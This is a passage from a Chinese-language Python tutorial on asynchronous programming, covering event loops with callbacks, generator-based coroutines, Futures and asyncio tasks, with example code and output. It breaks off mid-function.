所以selector机制(后文以此称呼代指epoll/kqueue)是设计用来解决大量并发连接的。当系统中有大量非阻塞调用能随时产生事件的时候,selector机制才能发挥最大的威力。

下面是如何启创建10个下载任务和启动事件循环的:
上述执行结果令人振奋。在单线程内用事件循环+回调搞定了10篇网页同时下载的问题。这已经是异步编程了。虽然有一个for循环顺序地创建Crawler实例并调用fetch方法,但是fetch内仅有connect()和注册可写事件,而且从执行时间明显可以推断,多个下载任务确实在同时进行

上述代码异步执行的过程:
创建Crawler实例;
调用fetch方法会创建socket连接和在selector上注册可写事件;
fetch内并无阻塞操作,该方法立即返回;
重复上述3个步骤,将10个不同的下载任务都加入事件循环;
启动事件循环,进入第1轮循环,阻塞在事件监听上;
当某个下载任务EVENT_WRITE被触发,回调其connected方法,第一轮事件循环结束;
进入第2轮事件循环,当某个下载任务有事件触发,执行其回调函数;此时已经不能推测是哪个事件发生,因为有可能是上次connected里的EVENT_READ先被触发,也可能是其他某个任务的EVENT_WRITE被触发;(此时原来在一个下载任务上会阻塞的那段时间被利用起来执行另一个下载任务了)
循环往复,直至所有下载任务被处理完成
退出事件循环,结束整个下载程序

总结
目前为止已经从同步阻塞学习到了异步非阻塞。掌握了在单线程内同时并发执行多个网络I/O阻塞型任务的黑魔法,而且与多线程相比,连线程切换都没有了,执行回调函数是函数调用开销,在线程的栈内完成,因此性能也更好,单机支持的任务规模也变成了数万到数十万个

部分编程语言中对异步编程的支持就止步于此(不含语言官方之外的扩展)。需要程序猿直接使用epoll去注册事件和回调、维护一个事件循环,然后大多数时间都花在设计回调函数上。

通过本节的学习应该认识到,不论什么编程语言,但凡要做异步编程,上述的"事件循环+回调"这种模式是逃不掉的,尽管它可能用的不是epoll,也可能不是while循环

事件循环+回调这种方式在单线程内实现异步编程,也确实能够大大提高程序运行效率,但在生产项目中要应对的复杂度会大大增加
回调层次过多时代码可读性差
破坏代码结构
共享状态管理困难
错误处理困难

如果说代码风格难看是小事,但栈撕裂和状态管理困难这两个缺点会让基于回调的异步编程很艰难,所以不同编程语言的生态都在致力于解决这个问题,才诞生了后来的Promise、Co-routine等解决方案。

Python生态也以终为始,秉承着"程序猿不必难程序猿"的原则,让语言和框架开发者苦逼一点,也要让应用开发者舒坦,在事件循环+回调的基础上衍生出了基于协程的解决方案,代表作有Tornado、Twisted、asyncio等

【 异步IO的概念 】
CPU的速度远远快于磁盘、网络等IO,在一个线程中CPU执行代码的速度极快,然而一旦遇到IO操作如读写文件、发送网络数据时就需要等待IO操作完成才能继续进行下一步操作,这种情况称为同步IO。
在IO操作的过程中当前线程被挂起,而其他需要CPU执行的代码就无法被当前线程执行了,因为一个IO操作就阻塞了当前线程,导致其他代码无法执行,所以必须使用多线程或多进程来并发执行代码为多个用户服务。每个用户都会分配一个线程,如果遇到IO导致线程被挂起,其他用户的线程不受影响。

多线程和多进程的模型虽然解决了并发问题,但系统不能无上限地增加线程。由于系统切换线程的开销也很大,所以一旦线程数量过多,CPU的时间就花在线程切换上了,真正运行代码的时间就少了,结果导致性能严重下降。

由于要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配,多线程和多进程只是解决这一问题的一种方法。
另一种解决IO问题的方法是异步IO,当代码需要执行一个耗时的IO操作时,它只发出IO指令,并不等待IO结果,然后就去执行其他代码了,一段时间后当IO返回结果时再通知CPU进行处理。

do_some_code()
f = open('/path/to/file', 'r')
r = f.read() # <== 线程停在此处等待IO操作结果
# IO操作完成后线程才能继续执行:
do_some_code(r)

异步IO模型需要一个消息循环,在消息循环中主线程不断地重复"读取消息-处理消息"这一过程:
loop = get_event_loop()
while True:
    event = loop.get_event()
    process_event(event)

消息模型其实早在应用在桌面应用程序中了,一个GUI程序的主线程就负责不停地读取消息并处理消息,所有的键盘、鼠标等消息都被发送到GUI程序的消息队列中,然后由GUI程序的主线程处理。
由于GUI线程处理键盘、鼠标等消息的速度非常快,所以用户感觉不到延迟。某些时候GUI线程在一个消息处理的过程中遇到问题导致一次消息处理时间过长,此时用户会感觉到整个GUI程序停止响应了,敲键盘、点鼠标都没有反应。这种情况说明在消息模型中,处理一个消息必须非常迅速,否则主线程将无法及时处理消息队列中的其他消息,导致程序看上去停止响应。

消息模型是如何解决同步IO必须等待IO操作这一问题的呢？当遇到IO操作时代码只负责发出IO请求,不等待IO结果,然后直接结束本轮消息处理,进入下一轮消息处理过程。当IO操作完成后将收到一条"IO完成"的消息,处理该消息时就可以直接获取IO操作结果。
在"发出IO请求"到收到"IO完成"的这段时间里,同步IO模型下主线程只能挂起,但异步IO模型下主线程并没有休息,而是在消息循环中继续处理其他消息。这样在异步IO模型下一个线程就可以同时处理多个IO请求,并且没有切换线程的操作。对于大多数IO密集型的应用程序,使用异步IO将大大提升系统的多任务处理能力。

</pre>

<h4>协程 Coroutine</h4><pre>
在linux系统中,线程就是轻量级的进程,通常也把协程称为轻量级的线程即微线程、纤程,协程的概念很早就提出来了,但直到最近几年才在某些语言中得到广泛应用。

协程的缺点
(1)使用协程,只能使用单线程,多线程的便利就一点都用不到。例如I/O阻塞程序,CPU仍会将整个任务挂起直到操作完成。
(2)一旦使用协程,大部分ython库并不能很好的兼容,这就会导致要改写大量的标准库函数。
所以最好别用协程,一旦用不好,协程给程序性能带来的提升,远远弥补不了其带来的灾难。

子程序或称为函数,在所有语言中都是层级调用,比如A调用B,B在执行过程中又调用了C,C执行完毕返回,B执行完毕返回,最后是A执行完毕,所以子程序调用是通过栈实现的,一个线程就是执行一个子程序。

子程序调用总是一个入口,一次返回,调用顺序是明确的,而协程的调用和子程序不同
协程看上去也是子程序,但执行过程中在子程序内部可中断,然后转而执行别的子程序,在适当的时候再返回来接着执行。

在一个子程序中中断,去执行其他子程序,不是函数调用,有点类似CPU的中断,比如子程序A、B:

</pre><textarea>
def A():
    print('1', end=' ')
    print('2', end=' ')
    print('3', end=' ')

def B():
    print('x', end=' ')
    print('y', end=' ')
    print('z', end=' ')

# 假设由协程执行,在执行A的过程中,可以随时中断去执行B,B也可能在执行过程中中断再去执行A,结果可能是:
1 2 x y 3 z

</textarea><pre>
但在A中是没有调用B的,所以协程的调用比函数调用理解起来要难一些。
看起来A、B的执行有点像多线程,但协程的特点在于是一个线程里执行,那和多线程比协程有何优势？
最大的优势就是协程极高的执行效率,因为子程序切换不是线程切换,而是由程序自身控制,因此没有线程切换的开销,和多线程比,线程数量越多,协程的性能优势就越明显。
第二大优势就是不需要多线程的锁机制,因为只有一个线程,也不存在同时写变量冲突,在协程中控制共享资源不加锁,只需要判断状态就好了,所以执行效率比多线程高很多。

因为协程是一个线程执行,那怎么利用多核CPU呢？最简单的方法是多进程+协程,既充分利用多核,又充分发挥协程的高效率,可获得极高的性能。

基于生成器的协程
早期的Pythoner发现Python中有种特殊的对象生成器Generator,它的特点和协程很像。每一次迭代之间会暂停执行,继续下一次迭代的时候还不会丢失先前的状态。

为了支持用生成器做简单的协程,Python2.5对生成器进行了增强(PEP 342),该增强提案的标题是"Coroutines via Enhanced Generators"。有了PEP 342的加持,生成器可以通过yield暂停执行和向外返回数据,也可以通过send()向生成器内发送数据,还可以通过throw()向生成器内抛出异常以便随时终止生成器的运行

</pre>基于yield实现协程<textarea>
# 执行时sayHello()和sayHi()不断交替执行,当执行sayHello()时在yield处中断,当执行sayHi()时从yield处中断,切换回sayHello()从yield之后的一句开始执行,如此来回交替无缝连接

from collections import deque

def sayHello(n):
    while n > 0:
        print("hello~", n)
        yield n
        n -= 1
    print('say hello')

def sayHi(n):
    x = 0
    while x < n:
        print('hi~', x)
        yield
        x += 1
    print("say hi")

# 使用yield语句,实现简单任务调度器
class TaskScheduler(object):
    def __init__(self):
        self._task_queue = deque()

    def new_task(self, task):
        self._task_queue.append(task)  # 向调度队列添加新的任务

    def run(self):
        # 不断运行,直到队列中没有任务
        while self._task_queue:
            task = self._task_queue.popleft()
            try:
                next(task)
                self._task_queue.append(task)
            except StopIteration:      # 生成器结束
                pass

sched = TaskScheduler()
sched.new_task(sayHello(10))
sched.new_task(sayHi(15))
sched.run()

</textarea><pre>
Python对协程的支持是通过generator实现的
在generator中不但可以通过for循环来迭代,还可以不断调用next()函数获取由yield语句返回的下一个值。
但是Python的yield不但可以返回一个值,它还可以接收调用者发出的参数。

传统的生产者-消费者模型是一个线程写消息,一个线程取消息,通过锁机制控制队列和等待,但一不小心就可能死锁。
如果改用协程,生产者生产消息后,直接通过yield跳转到消费者开始执行,待消费者执行完毕后,切换回生产者继续生产,效率极高:

</pre><textarea>
def consumer():
    r = ''
    while True:
        n = yield r
        if not n:
            return
        print('[CONSUMER] Consuming %s...' % n)
        r = '200 OK'

def produce(c):
    c.send(None)
    n = 0
    while n < 5:
        n = n + 1
        print('[PRODUCER] Producing %s...' % n)
        r = c.send(n)
        print('[PRODUCER] Consumer return: %s' % r)
    c.close()

c = consumer()
produce(c)

# 执行结果:
[PRODUCER] Producing 1...
[CONSUMER] Consuming 1...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 2...
[CONSUMER] Consuming 2...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 3...
[CONSUMER] Consuming 3...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 4...
[CONSUMER] Consuming 4...
[PRODUCER] Consumer return: 200 OK
[PRODUCER] Producing 5...
[CONSUMER] Consuming 5...
[PRODUCER] Consumer return: 200 OK

</textarea><pre>
consumer函数是一个generator,把一个consumer传入produce后:
1、首先调用c.send(None)启动生成器
2、然后,一旦生产了东西,通过c.send(n)切换到consumer执行
3、consumer通过yield拿到消息,处理,又通过yield把结果传回
4、produce拿到consumer处理的结果,继续生产下一条消息
5、produce决定不生产了,通过c.close()关闭consumer,整个过程结束

整个流程无锁,由一个线程执行,produce和consumer协作完成任务,所以称为"协程",而非线程的抢占式多任务。

最后套用Donald Knuth的一句话总结协程的特点:"子程序就是协程的一种特例。"

【 未来对象(Future) 】
不用回调的方式了,怎么知道异步调用的结果呢？先设计一个对象,异步调用执行完的时候,就把结果放在它里面。这种对象称之为未来对象。
未来对象有一个result属性,用于存放未来的执行结果。还有个set_result()方法是用于设置result的,并且会在给result绑定值以后运行事先给future添加的回调。回调是通过未来对象的add_done_callback()方法添加的。

future有四种状态：
Pending
Running
Done
Cancelled

可以通过调用done,cancelled或running来看当前future是否处于该状态,done状态可以表示返回结果,也可以表示跑出了异常,也可以通过调用cancel来专门取消future,不过在python3.7之后,asyncio.run替我们做了这些事情

future还有一个实用的功能：允许在future变成完成状态时添加callback回调

</pre>

<h4>asyncio</h4><pre>
python由于GIL(全局锁)的存在,不能发挥多核的优势,其性能一直饱受诟病。然而在IO密集型的网络编程里异步处理比同步处理能提升成百上千倍的效率,弥补了python性能方面的短板,如最新的微服务框架japronto,resquests per second可达百万级。

python还有一个优势是第三方库极为丰富,运用十分方便。asyncio是python3.4版本引入到标准库的协程模块,直接内置了对异步IO的支持,用来编写并发代码,这个包使用事件循环驱动实现并发,python2x没有加这个库,python3.5又加入了async/await语法特性

1、异步网络操作
2、并发
3、协程

到目前为止实现协程的不仅仅只有asyncio,tornado和gevent都实现了类似功能,https://github.com/aio-libs

asyncio被用作多个提供高性能Python异步框架的基础,包括网络和网站服务,数据库连接库,分布式任务队列等
asyncio往往是构建IO密集型和高层级结构化网络代码的最佳选择。

asyncio模块提供了使用协程构建并发应用的工具。它使用一种单线程单进程的的方式实现并发,应用的各个部分彼此合作, 可以显示的切换任务,一般会在程序阻塞I/O操作的时候发生上下文切换如等待读写文件或请求网络。同时asyncio也支持调度代码在将来的某个特定事件运行,从而支持一个协程等待另一个协程完成,以处理系统信号和识别其他一些事件

asyncio提供的框架以事件循环(event loop)为中心,程序开启一个无限的循环,程序会把一些函数注册到事件循环上,当满足事件发生时调用相应的协程函数

同步是指完成事务的逻辑,先执行第一个事务,如果阻塞了会一直等待直到这个事务完成,再执行第二个事务,顺序执行
异步和同步相对,异步指在处理调用这个事务之后不会等待这个事务的处理结果,直接处理第二个事务去了,通过状态、通知、回调来通知调用者处理结果

事件循环
程序开启一个无限循环,把一些函数注册到事件循环上,当满足事件发生时调用相应的协程函数
事件循环是一种处理多并发量的有效方式,可以定义事件循环来简化使用轮询方法来监控事件,即当A发生时执行B。事件循环利用poller对象,使得不用控制任务的添加、删除和事件的控制。事件循环使用回调方法来知道事件的发生,它是asyncio提供的中央处理设备,支持如下操作：
1、注册、执行和取消延迟调用(超时)
2、创建可用于多种类型的通信的服务端和客户端的Transports
3、启动进程以及相关的和外部通信程序的Transports
4、将耗时函数调用委托给一个线程池
5、单线程(进程)的架构也避免的多线程(进程)修改可变状态的锁的问题。

与事件循环交互的应用要显示地注册将运行的代码,让事件循环在资源可用时向应用代码发出必要的调用。如：一个套接字再没有更多的数据可以读取,那么服务器会把控制全交给事件循环。

coroutine协程
协程对象,指一个使用async关键字定义的函数,它的调用不会立即执行函数,而是返回一个协程对象。协程对象需要注册到事件循环,由事件循环调用

task任务
一个协程对象就是一个原生可以挂起的函数,任务则是对协程进一步封装,其中包含了任务的各种状态
task是Future的一个子类,它知道如何包装和管理一个协程的执行。任务所需的资源可用时,事件循环会调度任务允许,并生成一个结果,从而可以由其他协程消费
一个协程对象就是一个可以挂起的函数,任务是对协程的进一步封装,其中包含了任务的各种状态

future
代表将来执行或没有执行的任务的结果,它和task上没有本质上的区别
future是一个数据结构,表示还未完成的工作结果。事件循环可监视Future对象是否完成,从而允许应用的一部分等待另一部分完成一些工作
期物,代表将来执行或没有执行的任务的结果,task可以说是future的子类

async/await关键字
python3.5用于定义协程的关键字,async定义一个协程,await用于挂起阻塞的异步调用接口。

asyncio提供一组高层级API用于:
并发地运行Python协程 并对其执行过程实现完全控制;
执行网络IO和IPC;
控制子进程;
通过队列 实现分布式任务;
同步并发代码;

此外还有一些低层级API以支持库和框架的开发者实现:
创建和管理事件循环,以提供异步API用于网络化,运行子进程,处理OS信号等
使用transports实现高效率协议;
通过async/await语法桥接基于回调的库和代码

import asyncio
print([e for e in dir(asyncio) if not e.startswith('_')])
['ALL_COMPLETED', 'AbstractEventLoop', 'AbstractEventLoopPolicy', 'AbstractServer', 'BaseEventLoop', 'BaseProtocol', 'BaseTransport', 'BoundedSemaphore', 'BufferedProtocol', 'CancelledError', 'Condition', 'DatagramProtocol', 'DatagramTransport', 'DefaultEventLoopPolicy', 'Event', 'FIRST_COMPLETED', 'FIRST_EXCEPTION', 'Future', 'Handle', 'IncompleteReadError', 'InvalidStateError', 'IocpProactor', 'LifoQueue', 'LimitOverrunError', 'Lock', 'PriorityQueue', 'ProactorEventLoop', 'Protocol', 'Queue', 'QueueEmpty', 'QueueFull', 'ReadTransport', 'SelectorEventLoop', 'Semaphore', 'SendfileNotAvailableError', 'StreamReader', 'StreamReaderProtocol', 'StreamWriter', 'SubprocessProtocol', 'SubprocessTransport', 'Task', 'TimeoutError', 'TimerHandle', 'Transport', 'WindowsProactorEventLoopPolicy', 'WindowsSelectorEventLoopPolicy', 'WriteTransport', 'all_tasks', 'as_completed', 'base_events', 'base_futures', 'base_subprocess', 'base_tasks', 'constants', 'coroutine', 'coroutines', 'create_subprocess_exec', 'create_subprocess_shell', 'create_task', 'current_task', 'ensure_future', 'events', 'format_helpers', 'futures', 'gather', 'get_child_watcher', 'get_event_loop', 'get_event_loop_policy', 'get_running_loop', 'iscoroutine', 'iscoroutinefunction', 'isfuture', 'locks', 'log', 'new_event_loop', 'open_connection', 'proactor_events', 'protocols', 'queues', 'run', 'run_coroutine_threadsafe', 'runners', 'selector_events', 'set_child_watcher', 'set_event_loop', 'set_event_loop_policy', 'shield', 'sleep', 'sslproto', 'start_server', 'streams', 'subprocess', 'sys', 'tasks', 'transports', 'wait', 'wait_for', 'windows_events', 'windows_utils', 'wrap_future']

</pre><textarea>
import asyncio
import itertools
import sys
import time

@asyncio.coroutine  # 协程可以使用@asyncio.coroutine装饰器装饰
def spin():
    for i in itertools.cycle('|/-\\'):
        write, flush = sys.stdout.write, sys.stdout.flush
        write(i)
        flush()
        write('\x08'*len(i))
        try:
            yield from asyncio.sleep(1)
        except asyncio.CancelledError:
            break

@asyncio.coroutine
def slow_f():
    yield from asyncio.sleep(3)
    return 3

@asyncio.coroutine
def sup():
    spiner = asyncio.async(spin()) # asyncio.async包装的协程不阻塞,立即返回一个Task对象
    print("spiner:",spiner)
    r = yield from slow_f()
    spiner.cancel()  # 取消Task,任务结束
    return r

def main():
    loop = asyncio.get_event_loop()    # 获取事件循环
    r = loop.run_until_complete(sup()) # 在事件循环中载入任务,驱动协程运行完毕
    loop.close()
    print("r:",r)

main()
# 输出结果：
# spiner: < Task pending coro=< spin() running at c:/Users/DELL/Desktop/ssj/search/descrip.py:7>>
# r: 3    # 运行期间会有动画指针

</textarea><pre>
【 异步方法 】
使用asyncio也就意味着需要一直写异步方法。
一个标准方法是这样的：
def regular_double(x):
    return 2 * x

而一个异步方法：
async def async_double(x):
    return 2 * x

从外观上看异步方法和标准方法没什么区别只是前面多了个async,"Async" 是"asynchronous"的简写,为了区别于异步函数,称标准函数为同步函数,从用户角度异步函数和同步函数有以下区别：
要调用异步函数,必须使用await关键字
不能在同步函数里使用await,否则会出错;但是在异步函数中,await是被允许的:

</pre><textarea>
def print_double(x):
    print(await async_double(x))   # <-- SyntaxError here

async def print_double(x):
    print(await async_double(x))   # <-- OK!

</textarea><pre>
【 协程 】
一般异步方法被称之为协程(Coroutine)。asyncio事件循环可以通过多种不同的方法启动一个协程。一般对于入口函数,最简答的方法就是使用run_until_complete(),并将协程直接传入这个方法

</pre><textarea>
import time
import asyncio

now = lambda : time.time()

# 通过async关键字定义一个协程(coroutine),当然协程不能直接运行,需要将协程加入到事件循环loop中
async def do_some_work(x):
    print("waiting:", x)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()        # 创建一个默认的事件循环,也可以实例化一个特定的循环类比如uvloop
    try:
        start = now()
        coroutine = do_some_work(2)        # 这里是一个协程对象,这个时候do_some_work函数并没有执行
        print(coroutine)
        loop.run_until_complete(coroutine) # 将协程注册加入到事件循环loop,并启动事件循环,当传入一个协程,其内部会自动封装成task,其中task是Future的子类
        print("Time:",now()-start)
    finally:
        loop.close()                       关闭事件循环
'''
< coroutine object do_some_work at 0x0000026E27C9A948>
waiting: 2
Time: 0.0
'''

</textarea><pre>
创建一个task
协程对象不能直接运行,在注册事件循环的时候,其实是run_until_complete方法将协程包装成为了一个任务(task)对象. task对象是Future类的子类,保存了协程运行后的状态,用于未来获取协程的结果

创建task后,在task加入事件循环之前为pending状态,当完成后状态为finished

通过loop.create_task(coroutine)创建task,同样的可以通过asyncio.ensure_future(coroutine)创建task

</pre><textarea>
import asyncio
import time

now = lambda: time.time()

async def do_some_work(x):
    print("waiting:", x)

start = now()
coroutine = do_some_work(2)
loop = asyncio.get_event_loop()
task = loop.create_task(coroutine)
print(task)
loop.run_until_complete(task)
print(task)
print("Time:",now()-start)
'''
< Task pending coro=< do_some_work() running at hello.py:6>>
waiting: 2
< Task finished coro=< do_some_work() done, defined at hello.py:6> result=None>
Time: 0.0
'''

</textarea>asyncio.create_task()函数用来并发运行作为asyncio任务的多个协程<textarea>
import asyncio
import time

async def say_after(delay, what):
    await asyncio.sleep(delay)
    print(what)

async def main():
    task1 = asyncio.create_task(say_after(1, 'hello'))
    task2 = asyncio.create_task(say_after(2, 'world'))
    print(f"started at {time.strftime('%X')}")
    # Wait until both tasks are completed (should take around 2 seconds.)
    await task1
    await task2
    print(f"finished at {time.strftime('%X')}")

asyncio.run(main())

</textarea><pre>
绑定回调
在task执行完成时可获取执行的结果,回调的最后一个参数是future对象,通过该对象可以获取协程返回值

通过add_done_callback方法给task任务添加回调函数,当task(也可以说是coroutine)执行完成时就会调用回调函数,并通过参数future获取协程执行的结果。这里创建的task和回调里的future对象实际上是同一个对象

</pre><textarea>
import time
import asyncio

now = lambda : time.time()

async def do_some_work(x):
    print("waiting:",x)
    return "Done after {}s".format(x)

def callback(future):
    print("callback:",future.result())

start = now()
coroutine = do_some_work(2)
loop = asyncio.get_event_loop()
task = asyncio.ensure_future(coroutine)
print(task)
task.add_done_callback(callback)
print(task)
loop.run_until_complete(task)
print(task)
print("Time:", now()-start)
'''
< Task pending coro=< do_some_work() running at hello.py:6>>
< Task pending coro=< do_some_work() running at hello.py:6> cb=[callback() at hello.py:10]>
waiting: 2
callback: Done after 2s
< Task finished coro=< do_some_work() done, defined at hello.py:6> result='Done after 2s'>
Done after 2s
Time: 0.0
'''

</textarea><pre>
阻塞和await
使用async可以定义协程对象,使用await可以针对耗时的操作进行挂起,就像生成器里的yield一样,函数让出控制权。协程遇到await,事件循环将会挂起该协程执行别的协程,直到其他的协程也挂起或执行完毕,再进行下一个协程的执行

耗时的操作一般是一些IO操作,例如网络请求、文件读取等,协程的目的也是让这些IO操作异步化。

在await asyncio.sleep(x),因为这里sleep了,模拟了阻塞或耗时的IO操作,这个时候就会让出控制权。 即当遇到阻塞调用的函数的时候,使用await方法将协程的控制权让出,以便loop调用其他的协程。

</pre><textarea>
import asyncio
import time

now = lambda :time.time()

async def do_some_work(x):
    print("waiting:",x)
    await asyncio.sleep(x)  # await后面就是调用耗时的操作
    return "Done after {}s".format(x)

start = now()
coroutine = do_some_work(2)
loop = asyncio.get_event_loop()
task = asyncio.ensure_future(coroutine)
loop.run_until_complete(task)
print("Task ret:", task.result())
print("Time:", now() - start)
'''
waiting: 2
Task ret: Done after 2s
Time: 2.015475034713745
'''

</textarea><pre>
并发和并行
并发指的是同时具有多个活动的系统
并行指的是用并发来使一个系统运行的更快,并行可以在操作系统的多个抽象层次进行运用
所以并发通常是指有多个任务需要同时进行,并行则是同一个时刻有多个任务执行

吃一个馒头算一个任务
并发是一个人同时吃三个馒头
并行是三个人同时分别吃一个馒头

</pre>使用aysncio实现并发<textarea>
import asyncio
import time

now = lambda :time.time()

async def do_some_work(x):
    print("Waiting:",x)
    await asyncio.sleep(x)
    return "Done after {}s".format(x)

start = now()
coroutine1 = do_some_work(1)
coroutine2 = do_some_work(2)
coroutine3 = do_some_work(4)

tasks = [
    asyncio.ensure_future(coroutine1),
    asyncio.ensure_future(coroutine2),
    asyncio.ensure_future(coroutine3)
]
loop = asyncio.get_event_loop()
# asyncio.wait(tasks)也可以使用asyncio.gather(*tasks),前者接受一个task列表,后者接收一堆task
loop.run_until_complete(asyncio.wait(tasks))
for task in tasks: print("Task ret:",task.result())
print("Time:",now()-start)
'''
Waiting: 1
Waiting: 2
Waiting: 4
Task ret: Done after 1s
Task ret: Done after 2s
Task ret: Done after 4s
Time: 4.01578164100647
'''

</textarea><pre>
协程嵌套
使用async可以定义协程,协程用于耗时的io操作,也可以封装更多的io操作过程,这样就实现了嵌套的协程,即一个协程中await了另外一个协程,如此连接起来

</pre>协程的调用和组合非常灵活,主要体现在对于结果的处理：如何返回,如何挂起<textarea>
import asyncio
import time

now = lambda: time.time()

async def do_some_work(x):
    print("waiting:",x)
    await asyncio.sleep(x)
    return "Done after {}s".format(x)

async def main():
    coroutine1 = do_some_work(1)
    coroutine2 = do_some_work(2)
    coroutine3 = do_some_work(4)
    tasks = [
        asyncio.ensure_future(coroutine1),
        asyncio.ensure_future(coroutine2),
        asyncio.ensure_future(coroutine3)
    ]

    dones, pendings = await asyncio.wait(tasks)
    for task in dones:
        print("Task ret:", task.result())

start = now()
loop = asyncio.get_event_loop()
loop.run_until_complete(main())
print("Time:", now()-start)
'''
waiting: 1
waiting: 2
waiting: 4
Task ret: Done after 2s
Task ret: Done after 4s
Task ret: Done after 1s
Time: 4.031109571456909
'''

# async.wait()改为results = await asyncio.gather(*tasks)之后的运行结果,这样得到的就是一个结果的列表
async def main():
    coroutine1 = do_some_work(1)
    coroutine2 = do_some_work(2)
    coroutine3 = do_some_work(4)
    tasks = [
        asyncio.ensure_future(coroutine1),
        asyncio.ensure_future(coroutine2),
        asyncio.ensure_future(coroutine3)
    ]

    results = await asyncio.gather(*tasks)
    for result in results: print("Task ret:",result)

start = now()
loop = asyncio.get_event_loop()
loop.run_until_complete(main())
print("Time:", now()-start)
'''
waiting: 1
waiting: 2
waiting: 4
Task ret: Done after 1s
Task ret: Done after 2s
Task ret: Done after 4s
Time: 4.015468120574951
'''

# 从协程中返回值,run_until_complete可以获取协程的返回值,如果没有给定返回值,则像函数一样,默认返回None
# 不在main协程函数里处理结果,直接返回await的内容,那么最外层的run_until_complete将会返回main协程的结果
async def main():
    coroutine1 = do_some_work(1)
    coroutine2 = do_some_work(2)
    coroutine3 = do_some_work(4)
    tasks = [
        asyncio.ensure_future(coroutine1),
        asyncio.ensure_future(coroutine2),
        asyncio.ensure_future(coroutine3)
    ]
    return await asyncio.gather(*tasks)

start = now()
loop = asyncio.get_event_loop()
results = loop.run_until_complete(main())
for result in results: print("Task ret:",result)
print("Time:", now()-start)
'''
waiting: 1
waiting: 2
waiting: 4
Task ret: Done after 1s
Task ret: Done after 2s
Task ret: Done after 4s
Time: 4.015491008758545
'''

# 或者返回使用asyncio.wait方式挂起协程
async def main():
    coroutine1 = do_some_work(1)
    coroutine2 = do_some_work(2)
    coroutine3 = do_some_work(4)
    tasks = [
        asyncio.ensure_future(coroutine1),
        asyncio.ensure_future(coroutine2),
        asyncio.ensure_future(coroutine3)
    ]
    return await asyncio.wait(tasks)

start = now()
loop = asyncio.get_event_loop()
done,pending = loop.run_until_complete(main())
for task in done:
    print("Task ret:",task.result())
print("Time:", now()-start)
'''
waiting: 1
waiting: 2
waiting: 4
Task ret: Done after 1s
Task ret: Done after 2s
Task ret: Done after 4s
Time: 3.999863386154175
'''

# 也可以使用asyncio的as_completed方法
async def main():
    coroutine1 = do_some_work(1)
    coroutine2 = do_some_work(2)
    coroutine3 = do_some_work(4)
    tasks = [
        asyncio.ensure_future(coroutine1),
        asyncio.ensure_future(coroutine2),
        asyncio.ensure_future(coroutine3)
    ]
    for task in asyncio.as_completed(tasks):
        result = await task
        print("Task ret: {}".format(result))

start = now()
loop = asyncio.get_event_loop()
loop.run_until_complete(main())
print("Time:", now()-start)
'''
waiting: 1
waiting: 2
waiting: 4
Task ret: Done after 1s
Task ret: Done after 2s
Task ret: Done after 4s
Time: 4.041452169418335
'''

</textarea><pre>
协程的停止
future对象有几个状态：Pending、Running、Done、Cacelled
创建future时task为pending,事件循环调用执行时当然就是running,调用完毕自然就是done,如果需要停止事件循环就需要先把task取消,可以使用asyncio.Task获取事件循环的task

</pre><textarea>
import asyncio
import time

now = lambda: time.time()

async def do_some_work(x):
    print("waiting:",x)
    await asyncio.sleep(x)
    return "Done after {}s".format(x)

coroutine1 = do_some_work(1)
coroutine2 = do_some_work(2)
coroutine3 = do_some_work(2)

tasks = [
    asyncio.ensure_future(coroutine1),
    asyncio.ensure_future(coroutine2),
    asyncio.ensure_future(coroutine3),
]

start = now()
loop = asyncio.get_event_loop()
try:
    loop.run_until_complete(asyncio.wait(tasks))
except KeyboardInterrupt as e:
    print(asyncio.Task.all_tasks())
    for task in asyncio.Task.all_tasks():
        print(task.cancel())
    loop.stop()
    loop.run_forever()
finally:
    loop.close()
print("Time:",now()-start)

# 启动事件循环之后马上ctrl+c会触发run_until_complete的执行异常KeyBorardInterrupt。然后通过循环asyncio.Task取消future
'''
waiting: 1
waiting: 2
waiting: 2
{< Task pending coro=< do_some_work() running at hello.py:8> wait_for=< Future pending cb=[< TaskWakeupMethWrapper object at 0x00000205790F8078>()]> cb=[_wait.< locals>._on_completion() at E:\soft\python\lib\asyncio\tasks.py:466]>,
 < Task pending coro=< wait() running at E:\soft\python\lib\asyncio\tasks.py:389> wait_for=< Future pending cb=[< TaskWakeupMethWrapper object at 0x00000205793355E8>()]>>,
 < Task pending coro=< do_some_work() running at hello.py:8> wait_for=< Future pending cb=[< TaskWakeupMethWrapper object at 0x00000205790DF3D8>()]> cb=[_wait.< locals>._on_completion() at E:\soft\python\lib\asyncio\tasks.py:466]>,
 < Task pending coro=< do_some_work() running at hello.py:8> wait_for=< Future pending cb=[< TaskWakeupMethWrapper object at 0x00000205790DF7F8>()]> cb=[_wait.< locals>._on_completion() at E:\soft\python\lib\asyncio\tasks.py:466]>}
True
True
True
True
Time: 1.0000309944152832
'''

# True表示cannel成功,loop stop之后还需要再次开启事件循环,最后在close,不然还会抛出异常

# 循环task逐个cancel是一种方案,可是正如把task的列表封装在main函数中,main函数外进行事件循环的调用,这个时候main相当于最外出的一个task,那么处理包装的main函数即可。

</textarea><pre>
不同线程的事件循环
很多时候事件循环用于注册协程,而有的协程需要动态的添加到事件循环中。一个简单的方式就是使用多线程。当前线程创建一个事件循环,然后在新建一个线程,在新线程中启动事件循环。当前线程不会被block。

</pre><textarea>
# 启动代码之后,当前线程不会被block,新线程中会按照顺序执行call_soon_threadsafe方法注册的more_work方法, 后者因为time.sleep操作是同步阻塞的,因此运行完毕more_work需要大致6 + 3

import asyncio
from threading import Thread
import time

now = lambda :time.time()

def start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

def more_work(x):
    print('More work {}'.format(x))
    time.sleep(x)
    print('Finished more work {}'.format(x))

start = now()
new_loop = asyncio.new_event_loop()
t = Thread(target=start_loop, args=(new_loop,))
t.start()
print('TIME: {}'.format(time.time() - start))

new_loop.call_soon_threadsafe(more_work, 6)
new_loop.call_soon_threadsafe(more_work, 3)
'''
TIME: 0.0
More work 6
Finished more work 6
More work 3
Finished more work 3
'''

</textarea>新线程协程<textarea>
# 主线程中创建一个new_loop,然后在另外的子线程中开启一个无限事件循环。`   主线程通过run_coroutine_threadsafe新注册协程对象。这样就能在子线程中进行事件循环的并发操作,同时主线程又不会被block。一共执行的时间大概在6s左右。

import asyncio
import time
from threading import Thread

now = lambda :time.time()

def start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

async def do_some_work(x):
